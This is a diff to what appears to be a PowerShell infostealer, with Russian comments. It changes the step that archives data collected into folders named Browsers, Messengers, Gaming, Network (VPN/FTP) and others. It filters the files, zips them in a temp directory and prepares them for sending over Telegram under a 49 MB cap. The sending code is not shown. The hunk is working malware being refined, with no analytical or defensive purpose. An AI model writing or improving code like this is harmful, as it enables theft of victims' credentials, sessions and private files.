@@ -290,7 +290,7 @@ function Get-VpnFtpData { param($OutDirectory)
     }
 }
 
-# --- Основной сценарий ---
+# --- Улучшенная архивация только собранных данных по папкам ---
 function Start-Execution {
     WriteMsg "Start"
     $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
@@ -312,11 +312,20 @@ function Start-Execution {
     WriteMsg "NetworkCollect"
     Get-VpnFtpData -OutDirectory "$tempDir\Network"
     WriteMsg "Archive"
-    # Определяем файлы для архивации — только то, что программа собрала!
-    $collectedFiles = Get-ChildItem "$tempDir" -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Length -le 20MB -and $_.Attributes -notmatch "System" -and $_.Name -notmatch "(?:pagefile|swapfile|\\.tmp$|\\.log$)" }
-    $archiveList = $collectedFiles | Select-Object -ExpandProperty FullName
+    # Архивация по собранным папкам (без мусора, больших и системных файлов)
+    $folders = @("System","Browsers","Files","Gaming","Messengers","Activity","Network")
+    $toArchive = @()
+    foreach ($folder in $folders) {
+        $fullPath = "$tempDir\$folder"
+        if (Test-Path $fullPath) {
+            $files = Get-ChildItem -Path $fullPath -File -Recurse -ErrorAction SilentlyContinue | Where-Object {
+                $_.Length -le 20MB -and $_.Attributes -notmatch "System" -and $_.Name -notmatch "(?:pagefile|swapfile|\\.tmp$|\\.log$|\\.ldb$|Cache|Code Cache|Service Worker|Local Storage|Session Storage)"
+            }
+            $toArchive += $files | Select-Object -ExpandProperty FullName
+        }
+    }
     $zipPath = "$env:TEMP\DataPackage-$(Get-Random).zip"
-    Compress-Archive -Path $archiveList -DestinationPath $zipPath -Force
+    Compress-Archive -Path $toArchive -DestinationPath $zipPath -Force
     $maxTelegramMB = 49
     $zipSizeMB = [Math]::Round((Get-Item $zipPath).Length / 1MB,2)
     WriteMsg "TelegramSend"
